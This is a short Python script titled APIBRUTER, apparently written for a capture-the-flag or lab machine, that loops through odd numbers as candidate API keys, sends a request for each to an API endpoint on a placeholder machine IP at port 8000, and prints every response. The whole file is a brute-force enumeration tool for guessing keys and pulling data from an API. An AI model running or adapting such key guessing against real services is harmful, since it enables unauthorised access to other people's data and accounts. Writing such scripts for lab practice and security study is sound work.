#!/usr/bin/env python3

#NAME: APIBRUTER
#Author: Joseph M

import requests 

for api_key in range(1,100,2):
    print(f"api_key {api_key}")
    html = requests.get(f'http://[machine_ip]:8000/api/{api_key}')
    print(html.text) 
